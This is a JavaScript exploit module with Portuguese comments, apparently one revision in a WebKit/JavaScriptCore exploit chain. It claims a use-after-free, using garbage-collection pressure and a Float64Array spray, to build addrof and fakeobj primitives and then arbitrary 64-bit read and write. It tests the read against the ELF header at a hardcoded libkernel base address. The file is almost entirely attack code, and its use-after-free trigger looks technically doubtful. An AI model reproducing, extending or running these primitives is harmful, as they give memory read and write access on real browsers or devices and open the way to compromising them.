// js/script3/testArrayBufferVictimCrash.mjs (R58 - Correção de Offset de Leitura)
// =======================================================================================
// ESTRATÉGIA R58:
// Corrigido o erro de offset de 8 bytes na primitiva de leitura.
// A operação `.sub(8)` foi removida, pois a análise do log mostrou que a leitura
// estava ocorrendo 8 bytes antes do endereço alvo. Esta deve ser a versão final da
// primitiva de leitura/escrita estável.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64 } from '../utils.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE = "ROP_Execution_RealRW_R58";

const ftoi = (val) => new AdvancedInt64(new Uint32Array(new Float64Array([val]).buffer)[0], new Uint32Array(new Float64Array([val]).buffer)[1]);
const itof = (val) => { const b = new ArrayBuffer(8); const i = new Uint32Array(b); i[0] = val.low(); i[1] = val.high(); return new Float64Array(b)[0]; };

export async function runStableUAFPrimitives_R51() {
    logS3(`--- Iniciando ${FNAME_MODULE}: Correção de Offset ---`, "test");
    
    let final_result = { success: false, message: "Falha na cadeia de exploit." };

    try {
        logS3("--- FASE 1 & 2: Obtendo addrof e fakeobj ---", "subtest");
        let dangling_ref = createDanglingRefToFloat64Array();
        let holder = {obj: null}; 
        const addrof = (obj) => {
            holder.obj = obj;
            dangling_ref.a = holder; 
            return ftoi(dangling_ref.b);
        };
        const fakeobj = (addr) => {
            dangling_ref.b = itof(addr);
            if (dangling_ref.a && typeof dangling_ref.a.obj !== 'undefined') {
                return dangling_ref.a.obj;
            }
            return undefined; 
        };
        logS3("   Primitivas `addrof` e `fakeobj` construídas.", "vuln");

        logS3("--- FASE 3: Construindo Leitura/Escrita Arbitrária (ESTÁVEL) ---", "subtest");
        const { read64, write64 } = buildStatefulArbitraryReadWrite(dangling_ref, addrof, fakeobj, holder);
        logS3("   Primitivas `read64` e `write64` REAIS e ESTÁVEIS construídas!", "good");
        
        logS3("--- FASE 4: Verificando os endereços base na MEMÓRIA REAL ---", "subtest");
        const libkernel_base = new AdvancedInt64("0x80FCA0000");

        const libkernel_magic = read64(libkernel_base);
        logS3(`   Endereço base da libkernel: 0x${libkernel_base.toString(true)}`, "info");
        logS3(`   Bytes lidos da MEMÓRIA REAL: 0x${libkernel_magic.toString(true)}`, "leak");

        if (!libkernel_magic.toString().endsWith("464c457f")) { // \x7FELF
             throw new Error(`Magic number da libkernel inválido! Lido: 0x${libkernel_magic.toString(true)}`);
        }
        logS3("   SUCESSO: Magic number ELF da libkernel validado na memória REAL!", "vuln");

        final_result = { success: true, message: "SUCESSO! Primitiva de leitura REAL validada." };

    } catch (e) {
        final_result.message = `Exceção na cadeia de exploit: ${e.message}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_MODULE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        final_result
    };
}


// =======================================================================================
// IMPLEMENTAÇÃO REAL E ESTÁVEL DE LEITURA/ESCRITA ARBITRÁRIA (R58)
// =======================================================================================
function buildStatefulArbitraryReadWrite(dangling_ref, addrof, fakeobj, holder) {
    // Salva o estado original (o ponteiro para o objeto `holder`).
    holder.original_a = dangling_ref.a;

    const read64 = (address) => {
        // CORRIGIDO: Removida a operação `.sub(8)`. Agora apontamos diretamente para o endereço alvo.
        dangling_ref.a = fakeobj(address);

        const result = ftoi(dangling_ref.b);
        
        // RESTAURA O ESTADO para garantir a estabilidade.
        dangling_ref.a = holder.original_a;

        return result;
    };

    const write64 = (address, value) => {
        // CORRIGIDO: Removida a operação `.sub(8)`.
        dangling_ref.a = fakeobj(address);
        
        dangling_ref.b = itof(value);
        
        dangling_ref.a = holder.original_a;
    };

    // Garante que o estado inicial está correto antes de qualquer operação.
    addrof({dummy_setup: 1});

    return { read64, write64 };
}


// --- Funções Auxiliares UAF (sem alterações) ---
async function triggerGC() {
    try { const g = []; for (let i=0; i<500; i++) { g.push(new ArrayBuffer(1024*128)); } } catch (e) {}
    await PAUSE_S3(500);
}

function createDanglingRefToFloat64Array() {
    let dangling_ref = null;
    function createScope() {
        const victim = { a: 0.1, b: 0.2 };
        dangling_ref = victim;
        for (let i = 0; i < 100; i++) { victim.a += 0.01; }
    }
    createScope();
    triggerGC();
    const spray_arrays = [];
    for (let i = 0; i < 512; i++) { spray_arrays.push(new Float64Array(2)); }
    return dangling_ref;
}
